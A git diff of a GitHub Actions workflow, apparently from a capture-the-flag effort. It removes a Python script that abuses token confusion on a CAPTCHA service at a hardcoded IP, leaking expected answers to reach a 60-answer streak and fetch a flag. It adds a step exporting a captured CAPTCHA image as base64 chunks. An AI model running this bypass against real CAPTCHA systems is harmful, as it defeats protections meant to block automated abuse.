@@ -1,4 +1,4 @@
-name: tmp-captcha-exploit
+name: tmp-captcha-image-export
 
 on:
   push:
@@ -10,211 +10,49 @@ permissions:
   contents: write
 
 jobs:
-  exploit:
+  export:
     runs-on: ubuntu-latest
-    timeout-minutes: 5
+    timeout-minutes: 3
     steps:
       - uses: actions/checkout@v4
         with:
           ref: tmp/captcha-probe-20260818
-
-      - name: Test token-confusion paths and solve adaptively
+      - name: Export known labeled CAPTCHA as small text chunks
         shell: bash
         run: |
-          rm -rf captcha-exploit-results
-          mkdir -p captcha-exploit-results
+          rm -rf captcha-image-export
+          mkdir -p captcha-image-export
+          cp captcha-exploit-results/042.body captcha-image-export/known-68rgsm.png
+          file captcha-image-export/known-68rgsm.png > captcha-image-export/file.txt
           python3 - <<'PY'
-          import base64
-          import hashlib
-          import http.cookiejar
-          import json
-          import os
-          import time
-          import urllib.error
-          import urllib.parse
-          import urllib.request
-
-          BASE = 'http://3.35.97.192:39111'
-          OUT = 'captcha-exploit-results'
-          os.makedirs(OUT, exist_ok=True)
-          events = []
-          counter = 0
-
-          def dump_event(ev):
-              global counter
-              counter += 1
-              events.append(ev)
-              with open(os.path.join(OUT, f'{counter:03d}.json'), 'w', encoding='utf-8') as f:
-                  json.dump(ev, f, ensure_ascii=False, indent=2)
-              print(json.dumps(ev, ensure_ascii=False))
-
-          def request(method, path, header_token=None, payload=None, save_body=False):
-              headers = {
-                  'User-Agent': 'Mozilla/5.0 Chrome/151',
-                  'Accept': '*/*',
-              }
-              body = None
-              if header_token is not None:
-                  headers['Authorization'] = f'Bearer {header_token}'
-              if payload is not None:
-                  body = json.dumps(payload).encode()
-                  headers['Content-Type'] = 'application/json'
-              req = urllib.request.Request(BASE + path, data=body, headers=headers, method=method)
-              started = time.time()
-              try:
-                  with urllib.request.urlopen(req, timeout=12) as r:
-                      raw = r.read(2_000_000)
-                      status = r.status
-                      rh = dict(r.headers.items())
-              except urllib.error.HTTPError as e:
-                  raw = e.read(2_000_000)
-                  status = e.code
-                  rh = dict(e.headers.items())
-              except Exception as e:
-                  ev = {'method': method, 'path': path, 'error': repr(e), 'elapsed': round(time.time()-started, 4)}
-                  dump_event(ev)
-                  return ev, b''
-              ev = {
-                  'method': method, 'path': path, 'status': status,
-                  'elapsed': round(time.time()-started, 4), 'headers': rh,
-                  'body_len': len(raw), 'body_sha256': hashlib.sha256(raw).hexdigest(),
-              }
-              try:
-                  ev['json'] = json.loads(raw)
-              except Exception:
-                  if len(raw) <= 30000:
-                      ev['text'] = raw.decode('utf-8', 'replace')
-                  else:
-                      ev['body_b64_prefix'] = base64.b64encode(raw[:2000]).decode()
-              dump_event(ev)
-              if save_body:
-                  open(os.path.join(OUT, f'{counter:03d}.body'), 'wb').write(raw)
-              return ev, raw
-
-          def start(label):
-              ev, _ = request('POST', '/start')
-              data = ev.get('json') or {}
-              token = data.get('token')
-              dump_event({'type': 'session', 'label': label, 'token': token, 'start': data})
-              if token and token.count('.') == 2:
-                  parts = token.split('.')
-                  try:
-                      pad = '=' * (-len(parts[1]) % 4)
-                      decoded = json.loads(base64.urlsafe_b64decode(parts[1] + pad))
-                      dump_event({'type': 'jwt_payload', 'label': label, 'payload': decoded})
-                  except Exception as e:
-                      dump_event({'type': 'jwt_decode_error', 'label': label, 'error': repr(e)})
-              return token, data
-
-          def captcha(token, label):
-              ev, raw = request('GET', '/captcha', header_token=token, save_body=True)
-              nonce = ev.get('headers', {}).get('X-Round-Nonce') or ev.get('headers', {}).get('x-round-nonce')
-              info = {'type': 'captcha', 'label': label, 'nonce': nonce,
-                      'image_sha256': hashlib.sha256(raw).hexdigest(), 'status': ev.get('status')}
-              dump_event(info)
-              return nonce, raw, ev
-
-          def submit(header_token, body_token, nonce, answer, label):
-              ev, _ = request('POST', '/submit', header_token=header_token,
-                              payload={'token': body_token, 'answer': answer, 'round_nonce': nonce})
-              dump_event({'type': 'submit_result', 'label': label, 'response': ev.get('json'),
-                          'status': ev.get('status')})
-              return ev
-
-          # Capture schema first.
-          request('GET', '/openapi.json', save_body=True)
-
-          # Check whether independent sessions receive the same first image.
-          t1, _ = start('compare-A')
-          t2, _ = start('compare-B')
-          if t1 and t2:
-              n1, i1, _ = captcha(t1, 'compare-A')
-              n2, i2, _ = captcha(t2, 'compare-B')
-              dump_event({'type': 'cross_session_image_compare', 'same_image': i1 == i2,
-                          'same_nonce': n1 == n2, 'sha_a': hashlib.sha256(i1).hexdigest(),
-                          'sha_b': hashlib.sha256(i2).hexdigest(), 'nonce_a': n1, 'nonce_b': n2})
-
-          candidates = [
-              ('H=oracle,B=victim', 'oracle', 'victim'),
-              ('H=victim,B=oracle', 'victim', 'oracle'),
-              ('H=oracle,B=oracle', 'oracle', 'oracle'),
-              ('H=victim,B=victim-baseline', 'victim', 'victim'),
-          ]
-          working = None
-
-          for cname, hsel, bsel in candidates:
-              victim, _ = start(cname + ':victim')
-              oracle, _ = start(cname + ':oracle')
-              if not victim or not oracle:
-                  continue
-              toks = {'victim': victim, 'oracle': oracle}
-              observed = []
-              usable = True
-              for rno in (1, 2):
-                  nonce, image, cev = captcha(victim, f'{cname}:round{rno}')
-                  if not nonce:
-                      usable = False
-                      break
-                  leak = submit(toks[hsel], toks[bsel], nonce, 'aaaa', f'{cname}:leak{rno}')
-                  leakj = leak.get('json') or {}
-                  expected = leakj.get('expected_answer')
-                  if not expected:
-                      observed.append({'round': rno, 'leak': leakj, 'failure': 'no expected_answer'})
-                      usable = False
-                      break
-                  correct = submit(victim, victim, nonce, expected, f'{cname}:correct{rno}')
-                  cj = correct.get('json') or {}
-                  observed.append({'round': rno, 'expected': expected, 'leak': leakj, 'correct': cj})
-                  if not cj.get('correct'):
-                      usable = False
-                      break
-              dump_event({'type': 'candidate_summary', 'candidate': cname, 'observed': observed,
-                          'usable': usable})
-              if usable and len(observed) == 2 and observed[-1].get('correct', {}).get('streak') == 2:
-                  working = {'name': cname, 'header_select': hsel, 'body_select': bsel,
-                             'victim': victim, 'oracle': oracle,
-                             'current_streak': observed[-1]['correct']['streak']}
-                  dump_event({'type': 'working_candidate', **working})
-                  break
-
-          # Continue directly to 60 if token confusion preserved the victim streak.
-          solved = False
-          if working:
-              victim = working['victim']
-              oracle = working['oracle']
-              toks = {'victim': victim, 'oracle': oracle}
-              streak = int(working['current_streak'])
-              while streak < 60:
-                  nonce, image, cev = captcha(victim, f'solve:round{streak+1}')
-                  if not nonce:
-                      break
-                  leak = submit(toks[working['header_select']], toks[working['body_select']],
-                                nonce, 'aaaa', f'solve:leak{streak+1}')
-                  expected = (leak.get('json') or {}).get('expected_answer')
-                  if not expected:
-                      break
-                  corr = submit(victim, victim, nonce, expected, f'solve:correct{streak+1}')
-                  cj = corr.get('json') or {}
-                  if not cj.get('correct'):
-                      break
-                  streak = int(cj.get('streak', -1))
-                  if cj.get('solved'):
-                      solved = True
-                      break
-              dump_event({'type': 'solve_loop_end', 'streak': streak, 'solved': solved})
-              flag, _ = request('GET', '/flag', header_token=victim)
-              dump_event({'type': 'flag_result', 'response': flag.get('json'), 'status': flag.get('status')})
-
-          with open(os.path.join(OUT, 'events.json'), 'w', encoding='utf-8') as f:
-              json.dump(events, f, ensure_ascii=False, indent=2)
+          import base64, json, pathlib, struct, zlib
+          src = pathlib.Path('captcha-image-export/known-68rgsm.png').read_bytes()
+          b64 = base64.b64encode(src).decode()
+          size = 6000
+          parts = [b64[i:i+size] for i in range(0, len(b64), size)]
+          for i, part in enumerate(parts):
+              pathlib.Path(f'captcha-image-export/chunk-{i:03d}.txt').write_text(part)
+          # Parse PNG chunks and preserve metadata inventory.
+          pos = 8
+          chunks = []
+          while pos + 12 <= len(src):
+              n = struct.unpack('>I', src[pos:pos+4])[0]
+              typ = src[pos+4:pos+8].decode('latin1')
+              data = src[pos+8:pos+8+n]
+              chunks.append({'type': typ, 'length': n, 'preview_hex': data[:64].hex()})
+              pos += 12 + n
+              if typ == 'IEND': break
+          pathlib.Path('captcha-image-export/manifest.json').write_text(json.dumps({
+              'label':'68rgsm','byte_length':len(src),'base64_length':len(b64),
+              'part_size':size,'part_count':len(parts),'png_chunks':chunks
+          }, indent=2))
           PY
-
-      - name: Commit exploit results
-        if: always()
+          rm captcha-image-export/known-68rgsm.png
+      - name: Commit export chunks
         shell: bash
         run: |
           git config user.name 'github-actions[bot]'
           git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
-          git add -f captcha-exploit-results
-          git commit -m 'chore: store temporary CAPTCHA exploit results' || exit 0
+          git add -f captcha-image-export
+          git commit -m 'chore: export labeled CAPTCHA image chunks' || exit 0
           git push origin HEAD:tmp/captcha-probe-20260818
